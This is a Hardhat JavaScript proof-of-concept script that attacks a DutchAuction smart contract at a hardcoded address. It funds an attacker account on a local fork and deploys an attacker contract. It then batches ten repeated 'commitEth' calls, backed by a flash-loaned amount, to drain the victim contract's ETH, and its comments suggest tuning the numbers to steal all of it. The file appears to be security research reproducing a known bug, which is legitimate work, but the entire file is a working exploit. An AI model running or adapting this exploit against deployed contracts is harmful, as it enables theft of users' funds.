const { ethers } = require("hardhat");
const DutchAuction_ABI = require('../abis/DutchAuction.json');

async function main() {

  const CONTRACT_ADDRESS = '0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e';

  const [ attacker ] = await ethers.getSigners();

  // Set attacker's ETH balance to 3, just to make it a bit more realistic
  await ethers.provider.send("hardhat_setBalance", [
    attacker.address,
    "0x29a2241af62c0000", // 3 ETH
  ]);

  const victimContract = new ethers.Contract(CONTRACT_ADDRESS, DutchAuction_ABI, attacker);

  console.log(`Initial victim ETH balance is ${
    ethers.utils.formatEther(await ethers.provider.getBalance(victimContract.address))
  } ETH`);
  console.log(`Initial attacker ETH balance is ${
    ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))
  } ETH`);

  console.log('Deploying attacker contract');
  const attackerContract = await (await ethers.getContractFactory("AttackerContract", attacker)).deploy();

  // This is just a rough estimation of how much ETH the call to the `batch` function needs
  // to have to remove most ETH from victim using a single batch of 10 calls.
  // It is not the best - it leaves some dust ETH in the victim contract, but it's enough for the purpose of this PoC.
  // By tweaking this number and the number of calls you can probably find the most efficient way to steal ALL available ETH.
  // Or perhaps the number can be exactly calculated in advance by querying some functions of the victim.
  // Also note that this amount of ETH is flash-loaned to execute the attack.
  let amountInWei = ethers.utils.parseEther('12518.76');
  let numberOfCalls = 10;

  console.log('Executing attack');
  await attackerContract.attack(
    victimContract.address,
    amountInWei, 
    Array(numberOfCalls).fill( // the array of calldatas to send to the `batch` function
      victimContract.interface.encodeFunctionData("commitEth", [attackerContract.address, true])
    )
  );
  
  console.log(`Final victim ETH balance is ${
    ethers.utils.formatEther(await ethers.provider.getBalance(victimContract.address))
  } ETH`);

  console.log(`Final attacker ETH balance is ${
    ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address))
  } ETH`);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
